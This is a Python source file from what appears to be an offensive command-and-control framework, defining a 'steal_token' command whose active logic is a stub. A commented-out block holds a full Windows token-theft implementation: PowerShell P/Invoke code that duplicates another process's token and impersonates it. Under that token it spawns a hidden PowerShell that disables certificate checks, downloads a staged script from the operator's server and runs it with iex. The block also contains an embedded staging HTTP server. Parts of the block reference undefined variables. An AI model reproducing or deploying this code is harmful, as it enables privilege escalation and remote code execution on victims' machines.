from core.gunnershell.commands.base import register, Command
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"

@register("steal_token")
class StealTokenCommand(Command):
	"""Steal a token and spawn payload: steal_token <args…>"""

	@property
	def help(self):
		return "steal_token <args…>    Token hijacking"

	def execute(self, args):
		out = self.logic(self.gs.sid, self.gs.os_type, *args, op_id=self.op_id)
		if out:
			print(brightgreen + out) if not out.startswith("[!]") else print(brightred + out)

	def logic(self, sid, os_type, *args, op_id="console"):
		return "Not Ready Yet"



"""
global page_count
	page_count = 0
	'''
	steal_token <PID> -f <format> -p <payload> -lh <ip> -lp <port> -x <http_port> [--ssl] [-obs <1|2|3>] [--beacon_interval <sec>]

	Spins up an HTTP server on -x to serve /payload.ps1 dynamically,
	then steals the token and launches:
	  iwr http://<ip>:-x/payload.ps1 | iex

	Example:
	  steal_token 1892 -f ps1 -p http-win -lh 10.0.0.1 -lp 4444 -x 8000 --ssl --beacon_interval 10 -obs 2
	'''
	if 'windows' not in os_type.lower():
		return "[*] steal_token only supported on Windows"

	parts = list(args)
	if '-p' not in parts:
		return "Usage: steal_token <PID> -p <tcp-win|http-win|https-win> [other flags]"

	# grab the payload type early so we can require beacon_interval only when needed
	try:
		payload_type = parts[parts.index('-p') + 1]

	except IndexError:
		return "Error: you must specify a value after -p"

	if payload_type == "tcp":
		parser = argparse.ArgumentParser(prog='steal_token', add_help=False)
		parser.add_argument('pid', type=int)
		parser.add_argument("-f", "--format", choices=["ps1", "bash"], required=True)
		parser.add_argument('-x','--http_port', type=int, required=True, help="Port for the staging HTTP(S) server")
		parser.add_argument('--serve_https', action='store_true', help="Serve over HTTPS instead of HTTP")
		parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], default=False, required=False)
		parser.add_argument("--ssl", dest="ssl", action="store_true", help="Use SSL/TLS for the TCP reverse shell payload", required=False)
		parser.add_argument("-p", "--payload", choices=["tcp"], required=True)
		parser.add_argument("-o", "--output", required=False)
		parser.add_argument("--os", choices=["windows","linux"], default=False, help="Target OS for the payload", required=False)
		parser.add_argument("-lh", "--local_host", required=True)
		parser.add_argument("-lp", "--local_port", required=True)

	elif payload_type == "http":
		parser = argparse.ArgumentParser(prog='steal_token', add_help=False)
		parser.add_argument('pid', type=int)
		parser.add_argument("-f", "--format", choices=["ps1", "bash"], required=True)
		parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], default=False, required=False)
		parser.add_argument("-p", "--payload", choices=["http"], required=True)
		parser.add_argument("-o", "--output", required=False)
		parser.add_argument('-x','--http_port', type=int, required=True, help="Port for the staging HTTP(S) server")
		parser.add_argument('--serve_https', action='store_true', help="Serve over HTTPS instead of HTTP")
		parser.add_argument("--jitter", type=int, default=0, help="Jitter percentage to randomize beacon interval (e.g., 30 = ±30%)")
		parser.add_argument("-H", "--headers", dest="headers", action="append", type=malleable.parse_headers, help="Custom HTTP header; either 'Name: Value' or JSON dict")
		parser.add_argument("--useragent", required=False, help="Custom User-Agent string")
		parser.add_argument("--accept", required=False, default=False, help="Set the Accept header value")
		parser.add_argument("--range", required=False, default=False, help="Set the Range header value (e.g., 'bytes=0-1024')")
		parser.add_argument("--os", choices=["windows","linux"], default=False, help="Target OS for the payload", required=False)
		parser.add_argument("-lh", "--local_host", required=True)
		parser.add_argument("-lp", "--local_port", required=True)
		parser.add_argument("--beacon_interval", required=True)

	elif payload_type == "https":
		parser = argparse.ArgumentParser(prog='steal_token', add_help=False)
		parser.add_argument('pid', type=int)
		parser.add_argument("-f", "--format", choices=["ps1", "bash"], required=True)
		parser.add_argument("-obs", "--obfuscation", type=int, choices=[1,2,3], default=False, required=False)
		parser.add_argument("-p", "--payload", choices=["https"], required=True)
		parser.add_argument("-o", "--output", required=False)
		parser.add_argument('-x','--http_port', type=int, required=True, help="Port for the staging HTTP(S) server")
		parser.add_argument('--serve_https', action='store_true', help="Serve over HTTPS instead of HTTP")
		parser.add_argument("--jitter", type=int, default=0, help="Jitter percentage to randomize beacon interval (e.g., 30 = ±30%)")
		parser.add_argument("-H", "--headers", dest="headers", action="append", type=malleable.parse_headers, help="Custom HTTP header; either 'Name: Value' or JSON dict")
		parser.add_argument("--useragent", required=False, default=False, help="Custom User-Agent string")
		parser.add_argument("--accept", required=False, default=False, help="Set the Accept header value")
		parser.add_argument("--range", required=False, default=False, help="Set the Range header value (e.g., 'bytes=0-1024')")
		parser.add_argument("--os", choices=["windows","linux"], default="windows", help="Target OS for the payload", required=False)
		parser.add_argument("-lh", "--local_host", required=True)
		parser.add_argument("-lp", "--local_port", required=True)
		parser.add_argument("--beacon_interval", required=True)

	else:
		print(brightred + f"Unknown payload type: {payload_type}")

	try:
		args = parser.parse_args(parts[1:])
		all_headers = {}

		if payload_type in ("http", "https"):
			useragent = args.useragent
			accept = args.accept
			byte_range = args.range

		else:
			useragent = None
			accept = None
			byte_range = None

		if payload_type in ("http", "https"):

			if getattr(args, "headers", None):
				for hdr in args.headers:
					all_headers.update(hdr)

				# Header keys to normalize and extract
				key_map = {
					 "user-agent": "useragent",
					"accept": "accept",
					"range": "byte_range"
				}

				for k, var_name in key_map.items():
					found_keys = [h for h in all_headers if h.lower() == k]

					if found_keys:
						if locals()[var_name] is False:  # Not explicitly set via flag
							locals()[var_name] = all_headers[found_keys[0]]

						for key in found_keys:
							del all_headers[key]

			else:
				all_headers = {}

	except SystemExit:
		print(brightyellow + utils.gunnershell_commands["steal_token"])


	if payload_type == "tcp":
		if args.ssl:
			args.ssl = True
			ssl = args.ssl

		else:
			args.ssl = False
			ssl = args.ssl

	else:
		ssl = False

	if payload_type not in ("http", "https"):
		beacon_interval = False

	else:
		beacon_interval = args.beacon_interval

	if payload_type in ("http", "https"):
		jitter = getattr(args, "jitter", 0)

	else:
		jitter = None

	if args.obfuscation == False:
		obfuscation = 0

	else:
		obfuscation = args.obfuscation

	try:
		os_type = args.os.lower()
		format_type = args.format.lower()

	except Exception as e:
		print(brightred + f"[!] The --os and -f arguments are required: {e}")

	if os_type == "windows":
		full = generate_payload_windows(args.local_host, args.local_port, obfuscation, ssl, format_type, payload_type, beacon_interval, headers=all_headers, useragent=useragent, accept=accept, byte_range=byte_range, jitter=jitter)

	elif os_type == "linux":
		full = generate_payload_linux(args.local_host, args.local_port, obfuscation, ssl, format_type, payload_type, beacon_interval, headers=all_headers, useragent=useragent, accept=accept, range=byte_range, jitter=jitter)

	else:
		print(brightred + f"[!] Unsupported operating system selected!")

	if args.output:
		try:
			with open(args.output, "w") as f:
				f.write(raw)

		except Exception as e:
			print(brightred + f"[!] Failed to open local file {args.output}: {e}")

		print(brightgreen + f"[+] Payload written to {args.output}")


	priv_check = '''$ErrorActionPreference='Continue'; $reqs=@('SeDebugPrivilege','SeImpersonatePrivilege','SeAssignPrimaryTokenPrivilege'); $have=whoami /priv|Select-String 'Enabled'|%{($_ -split '\\s+')[0]}; $ok=$true; foreach($r in $reqs){ if($have -contains $r){ Write-Output "HAS $r" } else { Write-Output "MISSING $r"; $ok=$false } }; if($ok){ Write-Output 'SUCCESS' }'''

	sess = session_manager.sessions[sid]
	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)

	if sess.transport in ("tcp", "tls"):
		out = tcp_exec.run_command_tcp(sid, priv_check, timeout=0.5, portscan_active=True, op_id=op_id)

	elif sess.transport in ("http", "https"):
		out = http_exec.run_command_http(sid, priv_check, op_id=op_id)

	if "SUCCESS" in out:
		print(brightgreen + f"[*] Agent {display} has required privileges to steal token.")

	if "MISSING SeDebugPrivilege" in out or "MISSING SeImpersonatePrivilege" in out:
		error_msg = brightred + f"[!] Agent {display} does not have the required privileges to steal token."
		return error_msg

	if "MISSING SeAssignPrimaryTokenPrivilege" in out and "MISSING SeDebugPrivilege" not in out and "MISSING SeImpersonatePrivilege" not in out:
		print(brightred + f"[*] Agent {display} is missing SeAssignPrimaryTokenPrivilege privilege.")
		try:
			while True:
				questioncmd = input(brightyellow + f"Is the process {opts.pid} running as SYSTEM or has SeAssignPrimaryTokenPrivilege Y/n? ").strip()

				if not questioncmd:
					continue

				if questioncmd in ("yes", "Yes", "YES", "y", "Y"):
					print(brightyellow + f"[*] Proceeding with exploitation!")
					break

				if questioncmd in ("no", "No", "NO", "n", "N"):
					error_msg = brightred + f"[!] Failed to steal token from PID {opts.pid} missing SeAssignPrimaryToken privilege!"
					return error_msg

		except Exception as e:
			print(brightred + f"[!] An error ocurred while you were answering our question: {e}")

	# extract Base64 payload
	encoded = full.split()[-1]
	# construct the script to serve
	ps_script = (
		f"$enc='{encoded}'\n"
		"IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc)))"
	)

	if opts.serve_https:
		prefix = "https"
	else:
		prefix = "http"

	stage1 = f'''$pro = {opts.pid}
$orig = [IntPtr]::Zero
$dup  = [IntPtr]::Zero

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public enum PROCESS_ACCESS : uint {{
	PROCESS_QUERY_INFORMATION = 0x0400
}}

public enum TOKEN_ACCESS : uint {{
	TOKEN_ASSIGN_PRIMARY    = 0x0001,
	TOKEN_DUPLICATE         = 0x0002,
	TOKEN_IMPERSONATE       = 0x0004,
	TOKEN_QUERY             = 0x0008,
	TOKEN_ALL_ACCESS        = 0xF01FF
}}

// for CreateProcessWithTokenW
public enum LOGON_FLAGS : uint {{
	None = 0x00000000,
	LOGON_WITH_PROFILE = 0x00000001,
	LOGON_NETCREDENTIALS_ONLY = 0x00000002
}}

public enum TOKEN_TYPE : int {{ TokenPrimary = 1, TokenImpersonation = 2 }}
public enum SECURITY_IMPERSONATION_LEVEL : int {{
	SecurityAnonymous=0, SecurityIdentification=1,
	SecurityImpersonation=2, SecurityDelegation=3
}}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO {{
	public Int32 cb;
	public string lpReserved;
	public string lpDesktop;
	public string lpTitle;
	public UInt32 dwX;
	public UInt32 dwY;
	public UInt32 dwXSize;
	public UInt32 dwYSize;
	public UInt32 dwXCountChars;
	public UInt32 dwYCountChars;
	public UInt32 dwFillAttribute;
	public UInt32 dwFlags;
	public UInt16 wShowWindow;
	public UInt16 cbReserved2;
	public IntPtr lpReserved2;
	public IntPtr hStdInput;
	public IntPtr hStdOutput;
	public IntPtr hStdError;
}}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION {{
	public IntPtr hProcess;
	public IntPtr hThread;
	public UInt32 dwProcessId;
	public UInt32 dwThreadId;
}}

public class NativeMethods {{
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(
		PROCESS_ACCESS dwDesiredAccess,
		bool bInheritHandle,
		int dwProcessId
	);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool OpenProcessToken(
		IntPtr ProcessHandle,
		TOKEN_ACCESS DesiredAccess,
		out IntPtr TokenHandle
	);

	//---- add this: full control so we can CreateEnvironmentBlock + CreateProcessWithTokenW
	public const uint TOKEN_ALL_ACCESS = 0xF01FF;

	[DllImport("advapi32.dll", SetLastError=true)]
	public static extern bool DuplicateTokenEx(
		IntPtr hExistingToken,
		uint dwDesiredAccess,
		IntPtr lpTokenAttributes,
		int SECURITY_IMPERSONATION_LEVEL,
		int TOKEN_TYPE,               // 1 = Primary, 2 = Impersonation
		out IntPtr phNewToken
	);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool ImpersonateLoggedOnUser(
		IntPtr hToken
	);

	[DllImport("userenv.dll", SetLastError=true)]
	public static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

	[DllImport("userenv.dll", SetLastError=true)]
	public static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

	[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
	public static extern bool CreateProcessWithTokenW(
		IntPtr hToken,
		LOGON_FLAGS dwLogonFlags,
		string lpApplicationName,
		string lpCommandLine,
		uint dwCreationFlags,
		IntPtr lpEnvironment,
		string lpCurrentDirectory,
		ref STARTUPINFO lpStartupInfo,
		out PROCESS_INFORMATION lpProcessInformation
	);
}}
'@


$hProc = [NativeMethods]::OpenProcess(
	[PROCESS_ACCESS]::PROCESS_QUERY_INFORMATION,
	$false,
	[int]$pro
)
if ($hProc -eq [IntPtr]::Zero) {{
	Write-Error "OpenProcess failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}}


if (-not [NativeMethods]::OpenProcessToken($hProc, [TOKEN_ACCESS]::TOKEN_DUPLICATE, [ref]$orig)) {{
	Write-Error "OpenProcessToken failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}}


if (-not [NativeMethods]::DuplicateTokenEx(
		$orig,
		[NativeMethods]::TOKEN_ALL_ACCESS,
		[IntPtr]::Zero,
		2,
		1,
		[ref]$dup
	 )) {{
	Write-Error "DuplicateTokenEx failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}}


if (-not [NativeMethods]::ImpersonateLoggedOnUser($dup)) {{
	Write-Error "Impersonation failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}}

Write-Host "Impersonation succeeded, now launching powershell.exe as that user..."


$si = New-Object STARTUPINFO
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
$pi = New-Object PROCESS_INFORMATION

$exePath = (Get-Command powershell.exe).Source


$CREATE_NO_WINDOW   = 0x08000000

$cmd = 'powershell.exe -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; $wc = New-Object Net.WebClient; $wc.Proxy = [Net.GlobalProxySelection]::GetEmptyWebProxy(); $s = $wc.DownloadString(' + "'{prefix}://{opts.local_host}:{opts.http_port}/winsuvccheck'" + '); iex $s}}"'
$success = [NativeMethods]::CreateProcessWithTokenW(
	$dup,
	[LOGON_FLAGS]::None,
	$exePath,
	$cmd,
	$CREATE_NO_WINDOW,
	[IntPtr]::Zero,
	(Get-Location).Path,
	[ref]$si,
	[ref]$pi
)

if (-not $success) {{
	$err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
	Write-Error "CreateProcessWithTokenW failed: $err"

}}'''

	# HTTP server handler
	class _H(BaseHTTPRequestHandler):
		def do_GET(self):
			if self.path == '/winsuvccheck':
				self.send_response(200)
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(ps_script.encode())

			elif self.path == '/winprcrpu':
				self.send_response(200)
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(stage1.encode())
			else:
				self.send_response(404)
				self.end_headers()
		def log_message(self, *args):
			return

	# start HTTP or HTTPS server
	if opts.serve_https:
		# HTTPS: wrap socket with TLS context
		httpd = HTTPServer(('0.0.0.0', opts.http_port), _H)
		ctx  = tcp_listener.generate_tls_context(opts.local_host)
		httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

	else:
		httpd = HTTPServer(('0.0.0.0', opts.http_port), _H)

	server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
	server_thread.start()


	ps_cmd = (
		"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;"
		"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
		"$wc = New-Object Net.WebClient;"
		"$wc.Proxy = [Net.GlobalProxySelection]::GetEmptyWebProxy();"
		f"$s = $wc.DownloadString('{prefix}://{opts.local_host}:{opts.http_port}/winprcrpu');"
		"iex $s"
		)


	try:
		result = _do_steal_and_launch(sid, opts.pid, ps_cmd, op_id=op_id)
		page_count = 2


		return result

	finally:
		if page_count == 2:
			httpd.shutdown()
			httpd.server_close()
			server_thread.join()
			page_count = 0

		else:
			pass


def _do_steal_and_launch(sid, pid, ps_payload, op_id="console"):
	# P/Invoke snippet for token steal + CreateProcessWithTokenW
	sess = session_manager.sessions[sid]
	if sess.transport in ('http','https'):
		return http_exec.run_command_http(sid, ps_payload, op_id=op_id)

	elif sess.transport in ("tcp", "tls"):
		return tcp_exec.run_command_tcp(sid, ps_payload, timeout=0.5, portscan_active=True, op_id=op_id)

	else:
		return brightred + f"[!] Unsupported session type!"

"""